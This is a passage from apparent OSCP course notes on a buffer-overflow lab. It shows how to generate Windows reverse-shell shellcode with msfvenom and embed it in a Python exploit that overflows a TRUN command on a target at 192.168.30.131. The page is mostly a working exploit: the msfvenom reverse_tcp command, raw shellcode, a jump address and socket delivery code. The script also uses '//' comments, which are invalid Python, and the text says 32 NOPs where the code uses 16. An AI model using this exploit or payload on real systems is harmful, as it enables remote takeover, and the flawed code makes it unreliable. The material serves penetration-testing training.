---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/course-review/cyber-security-courses-journey/oscp-journey/ctf/buffer-overflow/bof-tcm/7-generating-shellcode
---

# 7- Generating Shellcode

**Generating Shellcode:** Once we have the information from step 5 to 6, we can generate the malicious shell code that will allow us to get the reverse shell.

We can use the tool from metasploit to generate shell code.

{% code overflow="wrap" %}
```
msfvenom -p windows/shell_reverse_tcp lhost=192.168.30.130 lport=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
```
{% endcode %}

* -p for the payload
* EXITFUNC=thread  make our exploit a little bit more stable
* -f export the file type in C
* -a for architecture x86
* -b for bad characters

<figure><img src="../../../../../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>

> In case, you're working with a very limited space. Supposed you have only 200 bytes left and your payload size 351 bytes so it's not going to work because you're going to truncated at 200.

Now, we're going to create another python script and copy the shell code from kali and paste it in the python script. we need to use byte encode **"b"** letter in front of the payload.

{% code title="6-shellcode.py" %}
```python
//python3 6-shellcode.py


#!/usr/bin/python3

import sys, socket
from time import sleep

//msfvenom -p windows/shell_reverse_tcp lhost=192.168.30.130 lport=4444 EXITFUNC=thread -f c -a x86 -b "\x00"

overflow = (b"\xdd\xc3\xbd\x17\xbb\x2f\xfb\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
b"\x52\x31\x6a\x17\x03\x6a\x17\x83\xfd\x47\xcd\x0e\xfd\x50\x90"
b"\xf1\xfd\xa0\xf5\x78\x18\x91\x35\x1e\x69\x82\x85\x54\x3f\x2f"
b"\x6d\x38\xab\xa4\x03\x95\xdc\x0d\xa9\xc3\xd3\x8e\x82\x30\x72"
b"\x0d\xd9\x64\x54\x2c\x12\x79\x95\x69\x4f\x70\xc7\x22\x1b\x27"
b"\xf7\x47\x51\xf4\x7c\x1b\x77\x7c\x61\xec\x76\xad\x34\x66\x21"
b"\x6d\xb7\xab\x59\x24\xaf\xa8\x64\xfe\x44\x1a\x12\x01\x8c\x52"
b"\xdb\xae\xf1\x5a\x2e\xae\x36\x5c\xd1\xc5\x4e\x9e\x6c\xde\x95"
b"\xdc\xaa\x6b\x0d\x46\x38\xcb\xe9\x76\xed\x8a\x7a\x74\x5a\xd8"
b"\x24\x99\x5d\x0d\x5f\xa5\xd6\xb0\x8f\x2f\xac\x96\x0b\x6b\x76"
b"\xb6\x0a\xd1\xd9\xc7\x4c\xba\x86\x6d\x07\x57\xd2\x1f\x4a\x30"
b"\x17\x12\x74\xc0\x3f\x25\x07\xf2\xe0\x9d\x8f\xbe\x69\x38\x48"
b"\xc0\x43\xfc\xc6\x3f\x6c\xfd\xcf\xfb\x38\xad\x67\x2d\x41\x26"
b"\x77\xd2\x94\xe9\x27\x7c\x47\x4a\x97\x3c\x37\x22\xfd\xb2\x68"
b"\x52\xfe\x18\x01\xf9\x05\xcb\xee\x56\x1b\x89\x87\xa4\x23\x9c"
b"\x0b\x20\xc5\xf4\xa3\x64\x5e\x61\x5d\x2d\x14\x10\xa2\xfb\x51"
b"\x12\x28\x08\xa6\xdd\xd9\x65\xb4\x8a\x29\x30\xe6\x1d\x35\xee"
b"\x8e\xc2\xa4\x75\x4e\x8c\xd4\x21\x19\xd9\x2b\x38\xcf\xf7\x12"
b"\x92\xed\x05\xc2\xdd\xb5\xd1\x37\xe3\x34\x97\x0c\xc7\x26\x61"
b"\x8c\x43\x12\x3d\xdb\x1d\xcc\xfb\xb5\xef\xa6\x55\x69\xa6\x2e"
b"\x23\x41\x79\x28\x2c\x8c\x0f\xd4\x9d\x79\x56\xeb\x12\xee\x5e"
b"\x94\x4e\x8e\xa1\x4f\xcb\xae\x43\x45\x26\x47\xda\x0c\x8b\x0a"
b"\xdd\xfb\xc8\x32\x5e\x09\xb1\xc0\x7e\x78\xb4\x8d\x38\x91\xc4"
b"\x9e\xac\x95\x7b\x9e\xe4")

//Change the little endian value
shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 16 + overflow

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	//Change This IP address and Port
	s.connect(('192.168.30.131',9999))

	payload = b"TRUN /.:/" + shellcode

	s.send((payload))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
```
{% endcode %}

* **"A" \* 2003** get us to the EIP
* **\xaf\x11\x50\x62** when we get to EIP, we're going to hit this pointer address. This pointer address is jump address (break point). This value is called little endian.
* &#x20;**overflow** is the set of instruction that instruction we're providing.
* **\x90 \* 32** is called nop and nop are padding. They stand for no operation. We're just adding a little bit of pad space. If we didn't have that our overflow wouldn't actually work. If you have limited space, you have to 8 or 16.

Finally, we go to kali machine and run listener with netcat and run the **6-shellcode.py**.

<figure><img src="../../../../../../.gitbook/assets/image (257).png" alt=""><figcaption></figcaption></figure>

